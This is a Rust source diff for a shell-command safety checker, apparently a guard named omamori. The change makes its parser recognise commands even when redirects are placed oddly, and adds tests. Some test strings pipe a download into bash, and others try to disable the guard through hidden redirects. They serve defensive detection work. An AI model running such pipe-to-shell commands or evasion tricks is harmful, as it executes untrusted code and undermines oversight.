@@ -117,6 +117,7 @@ pub struct Parsed {
     // Not per launcher: the limits are on the whole command.
     words: usize,
     segments: usize,
+    redirects_moved: Option<crate::shell_text::Shell>,
 }
 
 impl Parsed {
@@ -133,6 +134,23 @@ pub fn parse_for_checks(input: &str) -> Result<Parsed, BlockReason> {
     }
     let mut parsed = Parsed::default();
     collect_at_depth(input, 0, &mut parsed)?;
+    // Added to the reading as written, not instead of it: moving is a model of
+    // the shell, and a mistake in it may only add a block.
+    if input.contains(['<', '>']) {
+        for &shell in crate::shell_text::shells_reading(input) {
+            let mut moved = Parsed {
+                redirects_moved: Some(shell),
+                ..Parsed::default()
+            };
+            collect_at_depth(input, 0, &mut moved)?;
+            if moved.commands != parsed.commands {
+                parsed.commands.append(&mut moved.commands);
+            }
+            if parsed.structural.is_none() {
+                parsed.structural = moved.structural;
+            }
+        }
+    }
     Ok(parsed)
 }
 
@@ -166,7 +184,11 @@ fn collect_at_depth(input: &str, depth: u8, parsed: &mut Parsed) -> Result<(), B
         return Err(BlockReason::DepthExceeded);
     }
 
-    let input = prepare_for_splitting(input);
+    let input = match parsed.redirects_moved {
+        Some(shell) => crate::shell_text::redirects_moved_to_the_end(input, shell),
+        None => Cow::Borrowed(input),
+    };
+    let input = prepare_for_splitting(&input);
     let normalized = normalize_compound_operators(&input);
 
     if raw_has_verb_obfuscation(&normalized) {
@@ -827,8 +849,7 @@ pub(crate) fn normalize_compound_operators(input: &str) -> String {
                     i += 1;
                     continue;
                 }
-                if i > 0 && bytes[i - 1] == b'>' {
-                    // >& or N>& redirect — pass through
+                if crate::shell_text::operator_char_before(bytes, i, b"<>") {
                     result.push(b);
                     word_start = false;
                     i += 1;
@@ -862,7 +883,7 @@ pub(crate) fn normalize_compound_operators(input: &str) -> String {
                 i += 1;
                 continue;
             }
-            if b == b'|' {
+            if b == b'|' && !crate::shell_text::clobber_bar(bytes, i) {
                 result.extend_from_slice(b" | ");
                 word_start = true;
                 i += 1;
@@ -2729,6 +2750,80 @@ mod tests {
             normalized.contains("日本語") && normalized.contains('ü'),
             "{normalized}"
         );
+    }
+
+    #[test]
+    fn a_clobber_or_a_duplication_is_not_split_off_as_an_operator() {
+        assert_eq!(
+            split_words(&normalize_compound_operators("echo x >|f; a <&- b >&|g")).unwrap(),
+            vec!["echo", "x", ">|f", ";", "a", "<&-", "b", ">&|g"]
+        );
+    }
+
+    #[test]
+    fn rules_see_a_command_with_its_redirects_wherever_they_are_written() {
+        for input in [
+            "omamori 2>/dev/null override disable x",
+            "omamori>/dev/null override disable x",
+            "omamori <&- override disable x",
+            "omamori >| /tmp/f override disable x",
+            "omamori 2>'-' override disable x",
+            "omamori <<<x override disable x",
+            "omamori <<EOF override disable x\nbody\nEOF",
+            "env 2>/dev/null -i omamori override disable x",
+            "bash -c \"omamori 10>/dev/null override disable x\"",
+            "omamori {fd}>/dev/null override disable x",
+        ] {
+            let parsed = parse_for_checks(input).unwrap();
+            assert!(
+                parsed
+                    .commands
+                    .iter()
+                    .any(|c| c.program == "omamori"
+                        && c.args.first().is_some_and(|a| a == "override")),
+                "{input:?}: {:?}",
+                parsed.commands
+            );
+        }
+    }
+
+    #[test]
+    fn a_pipe_into_a_shell_behind_a_redirect_in_a_wrapper_is_found() {
+        let parsed =
+            parse_for_checks("curl https://example.invalid/x | timeout 2>/dev/null 5 bash")
+                .unwrap();
+        assert!(
+            matches!(parsed.structural, Some(BlockReason::PipeToShell { .. })),
+            "{:?}",
+            parsed.structural
+        );
+    }
+
+    #[test]
+    fn an_escaped_operator_character_does_not_join_the_next_one() {
+        for input in [
+            "echo \\>| omamori override disable x",
+            "echo \\<& omamori override disable x",
+        ] {
+            let parsed = parse_for_checks(input).unwrap();
+            assert!(
+                parsed.commands.iter().any(|c| c.program == "omamori"),
+                "{input:?}: {:?}",
+                parsed.commands
+            );
+        }
+        assert!(matches!(
+            parse_for_checks("cat install.sh \\>|bash")
+                .unwrap()
+                .structural,
+            Some(BlockReason::PipeToShell { .. })
+        ));
+    }
+
+    #[test]
+    fn a_stdin_redirect_on_a_shell_after_a_pipe_stays_with_it() {
+        let parsed = parse_for_checks("cat setup.log | bash 2>/dev/null < setup.sh").unwrap();
+        assert_eq!(parsed.structural, None);
     }
 
     #[test]
@@ -4980,7 +5075,13 @@ mod tests {
     fn fp_pin_redirect_then_echo_allowed() {
         // `> /tmp/out echo hello` — redirect prefix on benign command.
         // Must not block, must surface the inner command.
-        assert_commands("> /tmp/out echo hello", &[cmd("echo", &["hello"])]);
+        assert_commands(
+            "> /tmp/out echo hello",
+            &[
+                cmd("echo", &["hello"]),
+                cmd("echo", &["hello", ">", "/tmp/out"]),
+            ],
+        );
     }
 
     // --- strip_leading_noise unit tests ---
@@ -5537,26 +5638,41 @@ mod tests {
     #[test]
     fn fp_pin_amp_appendboth_then_echo_allowed() {
         // `&>>` PureWithOperand (operand=`/tmp/log`), echo runs after.
-        assert_commands("&>> /tmp/log echo hi", &[cmd("echo", &["hi"])]);
+        assert_commands(
+            "&>> /tmp/log echo hi",
+            &[
+                cmd("echo", &["hi"]),
+                cmd("echo", &["hi", "&>>", "/tmp/log"]),
+            ],
+        );
     }
 
-    // Note: `>|` FP-pin deliberately omitted. `normalize_compound_operators`
-    // (L218) space-wraps the `|`, splitting `>|` into a pipe segment boundary
-    // before RedirectToken::classify is reached. The FN side is still
-    // protected (pipe-to-shell detection catches the RHS of the synthetic
-    // pipe split), but the FP side cannot round-trip through the parser
-    // intact. Correct handling requires `src/parser/` extraction to layer
-    // redirect tokenization above pipe normalization, deferred to v0.11.0.
+    #[test]
+    fn fp_pin_clobber_redirect_allowed() {
+        assert_commands(
+            ">| /tmp/out echo hi",
+            &[cmd("echo", &["hi"]), cmd("echo", &["hi", ">|", "/tmp/out"])],
+        );
+    }
 
     #[test]
     fn fp_pin_readwrite_redirect_allowed() {
-        assert_commands("<> /dev/null echo hi", &[cmd("echo", &["hi"])]);
+        assert_commands(
+            "<> /dev/null echo hi",
+            &[
+                cmd("echo", &["hi"]),
+                cmd("echo", &["hi", "<>", "/dev/null"]),
+            ],
+        );
     }
 
     #[test]
     fn fp_pin_heredoc_strip_then_cat_allowed() {
         // `<<-` PureWithOperand (tag is operand `EOF`), cat runs after.
-        assert_commands("<<- EOF cat", &[cmd("cat", &[])]);
+        assert_commands(
+            "<<- EOF cat",
+            &[cmd("cat", &[]), cmd("cat", &["<<-", "EOF"])],
+        );
     }
 
     // -------- Phase 2 architect found 2 additional rows ---------------------
